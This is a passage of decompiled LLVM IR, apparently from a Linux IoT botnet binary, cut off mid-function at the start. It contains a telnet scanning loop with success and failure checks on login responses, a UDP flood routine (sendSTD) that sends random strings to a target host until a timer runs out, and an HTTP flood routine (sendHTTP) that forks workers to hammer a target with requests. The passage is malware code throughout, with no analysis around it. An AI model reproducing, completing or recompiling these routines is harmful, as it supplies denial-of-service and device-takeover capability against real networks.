  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b219 = load i32, i32* @esp, align 4
  %v2_804b219 = inttoptr i32 %v1_804b219 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b219, align 4
  %v1_804b21c = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804b21c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804b226:                             ; preds = %dec_label_pc_804afe6
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804b241 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804b241, i32* %eax.global-to-local, align 4
  %v1_804b243 = add i32 %v2_804b241, 7
  store i32 %v1_804b243, i32* @ebx, align 4
  %v0_804b246 = load i32, i32* @esp, align 4
  %v1_804b246 = inttoptr i32 %v0_804b246 to i32*
  store i32 0, i32* %v1_804b246, align 4
  %v1_804b24d = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804b24d = call i32 @__GI_time(i32* %v1_804b24d)
  store i32 %v2_804b24d, i32* %eax.global-to-local, align 4
  %v0_804b252 = load i32, i32* @ebx, align 4
  %v7_804b252 = icmp ult i32 %v0_804b252, %v2_804b24d
  %v1_804b254 = icmp eq i1 %v7_804b252, false
  br i1 %v1_804b254, label %dec_label_pc_804b3f0, label %dec_label_pc_804b25a

dec_label_pc_804b25a:                             ; preds = %dec_label_pc_804b226
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b273 = load i32, i32* @esp, align 4
  %v2_804b273 = inttoptr i32 %v1_804b273 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b273, align 4
  %v1_804b276 = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804b276, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804b280:                             ; preds = %dec_label_pc_804a4ec
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804b283 = load i32, i32* @esp, align 4
  %v1_804b283 = inttoptr i32 %v0_804b283 to i32*
  store i32 0, i32* %v1_804b283, align 4
  %v1_804b28a = inttoptr i32 %v6_804a502 to i32*
  %v2_804b28a = call i32 @__GI_time(i32* %v1_804b28a)
  %v0_804b294 = load i32, i32* @ebx, align 4
  %v2_804b2a4 = mul i32 %v0_804b294, 28
  %v1_804b2a8 = add i32 %v2_804b06d, %v2_804b2a4
  %v2_804b2ab = inttoptr i32 %v1_804b2a8 to i32*
  store i32 %v2_804b28a, i32* %v2_804b2ab, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b2c3 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804b2c3 = load i32, i32* %v3_804b2c3, align 4
  store i32 %v4_804b2c3, i32* %eax.global-to-local, align 4
  %v0_804b2c6 = load i32, i32* @esp, align 4
  %v1_804b2c6 = add i32 %v0_804b2c6, 12
  %v2_804b2c6 = inttoptr i32 %v1_804b2c6 to i32*
  store i32 16384, i32* %v2_804b2c6, align 4
  %v0_804b2ce = load i32, i32* @esp, align 4
  %v1_804b2ce = add i32 %v0_804b2ce, 8
  %v2_804b2ce = inttoptr i32 %v1_804b2ce to i32*
  store i32 4, i32* %v2_804b2ce, align 4
  %v0_804b2d6 = load i32, i32* @esp, align 4
  %v1_804b2d6 = add i32 %v0_804b2d6, 4
  %v2_804b2d6 = inttoptr i32 %v1_804b2d6 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8056759.60 to i32), i32* %v2_804b2d6, align 4
  %v0_804b2de = load i32, i32* %eax.global-to-local, align 4
  %v1_804b2de = load i32, i32* @esp, align 4
  %v2_804b2de = inttoptr i32 %v1_804b2de to i32*
  store i32 %v0_804b2de, i32* %v2_804b2de, align 4
  %v4_804b2e1 = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3bd, i32 %v6_804a502)
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804b2fc = load i32, i32* %v3_804b2c3, align 4
  store i32 %v4_804b2fc, i32* %eax.global-to-local, align 4
  %v0_804b2ff = load i32, i32* @esp, align 4
  %v1_804b2ff = add i32 %v0_804b2ff, 12
  %v2_804b2ff = inttoptr i32 %v1_804b2ff to i32*
  store i32 16384, i32* %v2_804b2ff, align 4
  %v0_804b307 = load i32, i32* @esp, align 4
  %v1_804b307 = add i32 %v0_804b307, 8
  %v2_804b307 = inttoptr i32 %v1_804b307 to i32*
  store i32 7, i32* %v2_804b307, align 4
  %v0_804b30f = load i32, i32* @esp, align 4
  %v1_804b30f = add i32 %v0_804b30f, 4
  %v2_804b30f = inttoptr i32 %v1_804b30f to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_805675e.61 to i32), i32* %v2_804b30f, align 4
  %v0_804b317 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b317 = load i32, i32* @esp, align 4
  %v2_804b317 = inttoptr i32 %v1_804b317 to i32*
  store i32 %v0_804b317, i32* %v2_804b317, align 4
  %v4_804b31a = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3bd, i32 %v6_804a502)
  %v0_804b31f = load i32, i32* bitcast ([443 x i8]** @global_var_8059754.63 to i32*), align 4
  %v5_804b329 = inttoptr i32 %v0_804b31f to i8*
  %v1_804b32f = and i32 %v0_804b31f, -256
  store i32 %v1_804b32f, i32* %eax.global-to-local, align 4
  store i32 %v0_804b31f, i32* @edi, align 4
  %v3_804b338 = call i32 @_strlen(i8* %v5_804b329)
  store i32 %v3_804b338, i32* @ebx, align 4
  %v0_804b341 = load i32, i32* bitcast ([443 x i8]** @global_var_8059754.63 to i32*), align 4
  store i32 %v0_804b341, i32* @esi, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804b35d = load i32, i32* %v3_804b2c3, align 4
  store i32 %v4_804b35d, i32* %eax.global-to-local, align 4
  %v0_804b360 = load i32, i32* @esp, align 4
  %v1_804b360 = add i32 %v0_804b360, 12
  %v2_804b360 = inttoptr i32 %v1_804b360 to i32*
  store i32 16384, i32* %v2_804b360, align 4
  %v0_804b368 = load i32, i32* @ebx, align 4
  %v1_804b368 = load i32, i32* @esp, align 4
  %v2_804b368 = add i32 %v1_804b368, 8
  %v3_804b368 = inttoptr i32 %v2_804b368 to i32*
  store i32 %v0_804b368, i32* %v3_804b368, align 4
  %v0_804b36c = load i32, i32* @esi, align 4
  %v1_804b36c = load i32, i32* @esp, align 4
  %v2_804b36c = add i32 %v1_804b36c, 4
  %v3_804b36c = inttoptr i32 %v2_804b36c to i32*
  store i32 %v0_804b36c, i32* %v3_804b36c, align 4
  %v0_804b370 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b370 = load i32, i32* @esp, align 4
  %v2_804b370 = inttoptr i32 %v1_804b370 to i32*
  store i32 %v0_804b370, i32* %v2_804b370, align 4
  %v5_804b373 = call i32 @__libc_send(i32 %v0_804b31f, i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3bd)
  store i32 %v5_804b373, i32* %eax.global-to-local, align 4
  %v2_804b378 = icmp slt i32 %v5_804b373, 0
  %v1_804b37a = icmp eq i1 %v2_804b378, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804b37a, label %dec_label_pc_804b39f, label %dec_label_pc_804b37c

dec_label_pc_804b37c:                             ; preds = %dec_label_pc_804b280
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b395 = load i32, i32* @esp, align 4
  %v2_804b395 = inttoptr i32 %v1_804b395 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b395, align 4
  %v2_804b398 = call i32 @reset_telstate(i32 %v0_804b31f)
  store i32 %v2_804b398, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804b39f:                             ; preds = %dec_label_pc_804b280
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804b3ba = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804b3ba, i32* %eax.global-to-local, align 4
  %v1_804b3bc = add i32 %v2_804b3ba, 25
  store i32 %v1_804b3bc, i32* @ebx, align 4
  %v0_804b3bf = load i32, i32* @esp, align 4
  %v1_804b3bf = inttoptr i32 %v0_804b3bf to i32*
  store i32 0, i32* %v1_804b3bf, align 4
  %tmp38 = inttoptr i32 %v0_804b31f to i32*
  %v3_804b3c6 = call i32 @__GI_time(i32* %tmp38)
  store i32 %v3_804b3c6, i32* %eax.global-to-local, align 4
  %v0_804b3cb = load i32, i32* @ebx, align 4
  %v7_804b3cb = icmp ult i32 %v0_804b3cb, %v3_804b3c6
  %v1_804b3cd = icmp eq i1 %v7_804b3cb, false
  br i1 %v1_804b3cd, label %dec_label_pc_804b3f0, label %dec_label_pc_804b3cf

dec_label_pc_804b3cf:                             ; preds = %dec_label_pc_804b39f
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b3e8 = load i32, i32* @esp, align 4
  %v2_804b3e8 = inttoptr i32 %v1_804b3e8 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b3e8, align 4
  %v2_804b3eb = call i32 @reset_telstate(i32 %v0_804b31f)
  store i32 %v2_804b3eb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3f0

dec_label_pc_804b3f0:                             ; preds = %dec_label_pc_804a4ec, %dec_label_pc_804b39f, %dec_label_pc_804b226, %dec_label_pc_804ae39, %dec_label_pc_804aba6, %dec_label_pc_804aa66, %dec_label_pc_804a6a9, %dec_label_pc_804b37c, %dec_label_pc_804b25a, %dec_label_pc_804b200, %dec_label_pc_804b145, %dec_label_pc_804b117, %dec_label_pc_804b09d, %dec_label_pc_804afb8, %dec_label_pc_804af92, %dec_label_pc_804af2f, %dec_label_pc_804ae6d, %dec_label_pc_804ae0b, %dec_label_pc_804addd, %dec_label_pc_804ad25, %dec_label_pc_804acff, %dec_label_pc_804ac9c, %dec_label_pc_804abda, %dec_label_pc_804ab78, %dec_label_pc_804ab4a, %dec_label_pc_804aa9a, %dec_label_pc_804aa40, %dec_label_pc_804a9a6, %dec_label_pc_804a980, %dec_label_pc_804a82c, %dec_label_pc_804a806, %dec_label_pc_804b3cf
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.247, %dec_label_pc_804a4ec ], [ %stack_var_-624.247, %dec_label_pc_804b39f ], [ %stack_var_-624.247, %dec_label_pc_804b3cf ], [ %stack_var_-624.247, %dec_label_pc_804b37c ], [ %stack_var_-624.247, %dec_label_pc_804b226 ], [ %stack_var_-624.247, %dec_label_pc_804b25a ], [ %stack_var_-624.247, %dec_label_pc_804b200 ], [ %stack_var_-624.247, %dec_label_pc_804b145 ], [ %stack_var_-624.247, %dec_label_pc_804b117 ], [ %stack_var_-624.247, %dec_label_pc_804b09d ], [ %stack_var_-624.247, %dec_label_pc_804afb8 ], [ %stack_var_-624.247, %dec_label_pc_804af92 ], [ %stack_var_-624.247, %dec_label_pc_804af2f ], [ %stack_var_-624.247, %dec_label_pc_804ae39 ], [ %stack_var_-624.247, %dec_label_pc_804ae6d ], [ %stack_var_-624.247, %dec_label_pc_804ae0b ], [ %stack_var_-624.247, %dec_label_pc_804addd ], [ %v4_804ac1e, %dec_label_pc_804ad25 ], [ %v4_804ac1e, %dec_label_pc_804acff ], [ %v4_804ac1e, %dec_label_pc_804ac9c ], [ %stack_var_-624.247, %dec_label_pc_804aba6 ], [ %stack_var_-624.247, %dec_label_pc_804abda ], [ %stack_var_-624.247, %dec_label_pc_804ab78 ], [ %stack_var_-624.247, %dec_label_pc_804ab4a ], [ %stack_var_-624.247, %dec_label_pc_804aa66 ], [ %stack_var_-624.247, %dec_label_pc_804aa9a ], [ %stack_var_-624.247, %dec_label_pc_804aa40 ], [ %stack_var_-624.247, %dec_label_pc_804a9a6 ], [ %stack_var_-624.247, %dec_label_pc_804a980 ], [ %stack_var_-624.247, %dec_label_pc_804a6a9 ], [ %stack_var_-624.247, %dec_label_pc_804a82c ], [ %stack_var_-624.247, %dec_label_pc_804a806 ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.248, %dec_label_pc_804a4ec ], [ %stack_var_-628.248, %dec_label_pc_804b39f ], [ %stack_var_-628.248, %dec_label_pc_804b3cf ], [ %stack_var_-628.248, %dec_label_pc_804b37c ], [ %stack_var_-628.248, %dec_label_pc_804b226 ], [ %stack_var_-628.248, %dec_label_pc_804b25a ], [ %stack_var_-628.248, %dec_label_pc_804b200 ], [ %stack_var_-628.248, %dec_label_pc_804b145 ], [ %stack_var_-628.248, %dec_label_pc_804b117 ], [ %stack_var_-628.248, %dec_label_pc_804b09d ], [ %v4_804aeb1, %dec_label_pc_804afb8 ], [ %v4_804aeb1, %dec_label_pc_804af92 ], [ %v4_804aeb1, %dec_label_pc_804af2f ], [ %stack_var_-628.248, %dec_label_pc_804ae39 ], [ %stack_var_-628.248, %dec_label_pc_804ae6d ], [ %stack_var_-628.248, %dec_label_pc_804ae0b ], [ %stack_var_-628.248, %dec_label_pc_804addd ], [ %stack_var_-628.248, %dec_label_pc_804ad25 ], [ %stack_var_-628.248, %dec_label_pc_804acff ], [ %stack_var_-628.248, %dec_label_pc_804ac9c ], [ %stack_var_-628.248, %dec_label_pc_804aba6 ], [ %stack_var_-628.248, %dec_label_pc_804abda ], [ %stack_var_-628.248, %dec_label_pc_804ab78 ], [ %stack_var_-628.248, %dec_label_pc_804ab4a ], [ %stack_var_-628.248, %dec_label_pc_804aa66 ], [ %stack_var_-628.248, %dec_label_pc_804aa9a ], [ %stack_var_-628.248, %dec_label_pc_804aa40 ], [ %stack_var_-628.248, %dec_label_pc_804a9a6 ], [ %stack_var_-628.248, %dec_label_pc_804a980 ], [ %stack_var_-628.248, %dec_label_pc_804a6a9 ], [ %stack_var_-628.248, %dec_label_pc_804a82c ], [ %stack_var_-628.248, %dec_label_pc_804a806 ]
  %v4_804b3f0 = add nuw nsw i32 %storemerge49, 1
  store i32 %v4_804b3f0, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b3f0, %arg2
  br i1 %exitcond, label %dec_label_pc_804a492, label %dec_label_pc_804a49e

; uselistorder directives
  uselistorder i32 %v4_804b3f0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32* %v1_804b051, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804afd1, { 1, 0 }
  uselistorder i32 %v4_804aeb1, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804ae24, { 1, 0 }
  uselistorder i32 %v0_804ad3e, { 1, 0 }
  uselistorder i32 %v4_804ac1e, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804ab91, { 1, 0 }
  uselistorder i32 %v5_804a90b, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804a8aa, { 1, 0 }
  uselistorder i32 %v2_804a88e, { 1, 0 }
  uselistorder i32 %v2_804a6f9, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_804a56a, { 1, 0 }
  uselistorder i32 %v6_804a502, { 8, 9, 10, 7, 5, 6, 4, 2, 3, 1, 0, 12, 11, 13 }
  uselistorder i32* %v1_804a4b9, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804a4b6, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804a4b4, { 50, 49, 52, 51, 53, 39, 38, 41, 40, 42, 44, 43, 45, 46, 47, 48, 34, 33, 36, 35, 37, 28, 27, 29, 30, 31, 32, 23, 22, 25, 24, 26, 17, 16, 18, 19, 20, 21, 9, 8, 11, 10, 12, 14, 13, 15, 0, 2, 1, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804a4b2, { 11, 12, 13, 1, 14, 0, 15, 2, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 4, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 6, 38, 5, 39, 40, 7, 41, 8, 42, 9 }
  uselistorder i32 %v1_804a4a4, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 %stack_var_-624.247, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %stack_var_-628.248, { 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %storemerge49, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_804a481, { 1, 2, 0 }
  uselistorder i32 %storemerge259, { 1, 0 }
  uselistorder i32 %v2_804a3da, { 1, 0 }
  uselistorder i32 %v2_804a3bd, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 5, 4, 3, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 7, 0, 10, 9, 4, 6, 8, 2, 1, 5, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 43, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66 }
  uselistorder i32* %eax.global-to-local, { 195, 1, 0, 4, 2, 3, 6, 5, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 22, 20, 21, 24, 23, 27, 25, 26, 29, 28, 30, 31, 32, 33, 36, 34, 35, 37, 38, 41, 39, 40, 44, 42, 43, 47, 45, 46, 49, 48, 50, 51, 54, 52, 55, 53, 56, 57, 58, 60, 59, 63, 61, 62, 64, 65, 66, 67, 68, 69, 71, 70, 74, 72, 73, 79, 76, 80, 77, 78, 81, 82, 75, 83, 84, 85, 88, 86, 89, 87, 90, 91, 92, 94, 93, 97, 95, 96, 98, 99, 100, 101, 102, 103, 105, 104, 108, 106, 107, 113, 110, 114, 111, 112, 115, 116, 109, 117, 118, 119, 121, 120, 124, 122, 123, 126, 125, 129, 127, 128, 130, 131, 132, 133, 134, 135, 137, 136, 138, 139, 140, 142, 141, 143, 144, 145, 146, 147, 150, 148, 149, 152, 151, 153, 154, 157, 155, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 173, 188, 189, 190, 191, 192, 193, 194, 217, 196, 197, 210, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 218, 211, 212, 213, 214, 216, 215 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804b3f0, { 31, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 0 }
  uselistorder label %dec_label_pc_804a6a9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a4ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a49e, { 1, 0 }
  uselistorder label %dec_label_pc_804a492, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a481, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b404 = load i32, i32* @ebp, align 4
  store i32 %v0_804b404, i32* %stack_var_-4, align 4
  %v4_804b404 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804b404, i32* @ebp, align 4
  %v4_804b424 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804b433 = call i32 @__GI_time(i32* null)
  %v1_804b441 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804b449 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804b46a = add i32 %v1_804b441, 12
  %v2_804b46a = inttoptr i32 %v1_804b46a to i32*
  %v3_804b46a = load i32, i32* %v2_804b46a, align 4
  %v2_804b472 = ptrtoint i32* %stack_var_-36 to i32
  %v1_804b478 = add i32 %v1_804b441, 16
  %v2_804b478 = inttoptr i32 %v1_804b478 to i32*
  %v3_804b478 = load i32, i32* %v2_804b478, align 4
  %v1_804b47b = inttoptr i32 %v3_804b478 to i32*
  %v2_804b47b = load i32, i32* %v1_804b47b, align 4
  %v4_804b488 = call i32 @bcopy(i32 %v2_804b47b, i32 %v2_804b472, i32 %v3_804b46a)
  %v1_804b490 = add i32 %v1_804b441, 8
  %v2_804b490 = inttoptr i32 %v1_804b490 to i32*
  %v3_804b490 = load i32, i32* %v2_804b490, align 4
  %v1_804b493 = urem i32 %v3_804b490, 65536
  store i32 %v1_804b493, i32* %stack_var_-40, align 4
  %v4_804b4c6 = bitcast i32* %stack_var_-184 to i16*
  %v5_804b56e = add i32 %v2_804b433, %arg3
  br label %dec_label_pc_804b4ab

dec_label_pc_804b4ab:                             ; preds = %dec_label_pc_804b593, %entry
  %storemerge = phi i32 [ %v4_804b593, %dec_label_pc_804b593 ], [ 0, %entry ]
  %v5_804b4c6 = call i32 @memcpy(i16* %v4_804b4c6, i32 ptrtoint ([36 x i8*]* @global_var_8056920.100 to i32), i32 144)
  store i32 %v5_804b4c6, i32* @eax, align 4
  %v0_804b4cb = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_804b593, label %dec_label_pc_804b521

dec_label_pc_804b521:                             ; preds = %dec_label_pc_804b4ab
  %v0_804b511 = load i32, i32* @ebp, align 4
  %v3_804b511 = add i32 %v0_804b511, -180
  %v2_804b4e6 = udiv i32 %v0_804b4cb, 36
  %tmp29 = mul nsw i32 %v2_804b4e6, -4
  %v2_804b503 = add i32 %v0_804b4cb, %tmp29
  %v2_804b511 = mul i32 %v2_804b503, 4
  %v4_804b511 = add i32 %v3_804b511, %v2_804b511
  %v5_804b511 = inttoptr i32 %v4_804b511 to i32*
  %v6_804b511 = load i32, i32* %v5_804b511, align 4
  %v5_804b53e = call i32 @__libc_send(i32 %v4_804b424, i32 %v6_804b511, i32 65, i32 0)
  %v4_804b558 = call i32 @__libc_connect(i32 %v4_804b424, i32 %v2_804b449, i32 16)
  %v2_804b564 = call i32 @__GI_time(i32* null)
  %v5_804b573 = icmp slt i32 %v2_804b564, %v5_804b56e
  br i1 %v5_804b573, label %dec_label_pc_804b593, label %dec_label_pc_804b575

dec_label_pc_804b575:                             ; preds = %dec_label_pc_804b521
  %v1_804b57b = call i32 @__libc_close(i32 %v4_804b424)
  %v1_804b587 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804b593:                             ; preds = %dec_label_pc_804b521, %dec_label_pc_804b4ab
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_804b4ab ], [ 0, %dec_label_pc_804b521 ]
  %v4_804b593 = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_804b4ab

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804b441, { 1, 0, 2 }
  uselistorder i32 %v4_804b424, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-541 = alloca i32, align 4
  %stack_var_-540 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804b59e = load i32, i32* @edi, align 4
  %v0_804b59f = load i32, i32* @ebx, align 4
  store i32 %v0_804b59f, i32* %stack_var_-12, align 4
  %v2_804b5b7 = call i32 @__GI_time(i32* null)
  %v5_804b5bc = add i32 %v2_804b5b7, %arg5
  %v2_804b64a = ptrtoint i32* %stack_var_-540 to i32
  %v4_804b69d = bitcast i32* %stack_var_-540 to i8*
  store i32 0, i32* @eax, align 4
  %v5_804b71534 = icmp sgt i32 %arg6, 0
  br i1 %v5_804b71534, label %dec_label_pc_804b5d5, label %dec_label_pc_804b71b

dec_label_pc_804b5d5:                             ; preds = %entry, %dec_label_pc_804b70c
  %storemerge35 = phi i32 [ %v4_804b70c, %dec_label_pc_804b70c ], [ 0, %entry ]
  %v0_804b5d5 = call i32 @random()
  %v2_804b5f8 = sdiv i32 %v0_804b5d5, 36
  store i32 %v2_804b5f8, i32* @ebx, align 4
  %tmp = mul i32 %v2_804b5f8, -36
  %v2_804b614 = add i32 %v0_804b5d5, %tmp
  store i32 %v2_804b614, i32* @edi, align 4
  %v5_804b653 = call i32 @sprintf(i32 %v2_804b64a, i32 ptrtoint ([64 x i8]* @global_var_80569b0.101 to i32), i32 %arg1, i32 %arg4)
  %v1_804b658 = call i32 @__libc_fork(i32 %v2_804b64a)
  %v1_804b65d = icmp eq i32 %v1_804b658, 0
  br i1 %v1_804b65d, label %dec_label_pc_804b70c, label %dec_label_pc_804b6eb

dec_label_pc_804b66a:                             ; preds = %dec_label_pc_804b6eb
  %v4_804b67b = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804b683 = icmp eq i32 %v4_804b67b, 0
  br i1 %v4_804b683, label %dec_label_pc_804b6eb, label %dec_label_pc_804b689

dec_label_pc_804b689:                             ; preds = %dec_label_pc_804b66a
  store i1 false, i1* @df, align 1
  store i32 %v2_804b64a, i32* @edi, align 4
  %v3_804b6a3 = call i32 @_strlen(i8* %v4_804b69d)
  %v5_804b6be = call i32 @__libc_write(i32 %v4_804b67b, i32* nonnull %stack_var_-540, i32 %v3_804b6a3)
  %v5_804b6db = call i32 @__libc_read(i32 %v4_804b67b, i32* nonnull %stack_var_-541, i32 1)
  %v1_804b6e6 = call i32 @__libc_close(i32 %v4_804b67b)
  br label %dec_label_pc_804b6eb

dec_label_pc_804b6eb:                             ; preds = %dec_label_pc_804b66a, %dec_label_pc_804b689, %dec_label_pc_804b5d5
  %v2_804b6f2 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b6f2, i32* @eax, align 4
  %v5_804b6fa = icmp slt i32 %v2_804b6f2, %v5_804b5bc
  br i1 %v5_804b6fa, label %dec_label_pc_804b66a, label %dec_label_pc_804b700

dec_label_pc_804b700:                             ; preds = %dec_label_pc_804b6eb
  %v1_804b707 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804b70c

dec_label_pc_804b70c:                             ; preds = %dec_label_pc_804b5d5, %dec_label_pc_804b700
  %v4_804b70c = add nuw nsw i32 %storemerge35, 1
  store i32 %v4_804b70c, i32* @eax, align 4
  %exitcond = icmp eq i32 %v4_804b70c, %arg6
  br i1 %exitcond, label %dec_label_pc_804b71b, label %dec_label_pc_804b5d5

dec_label_pc_804b71b:                             ; preds = %dec_label_pc_804b70c, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804b70c ]
  %v2_804b721 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b721, i32* @ebx, align 4
  store i32 %v0_804b59e, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
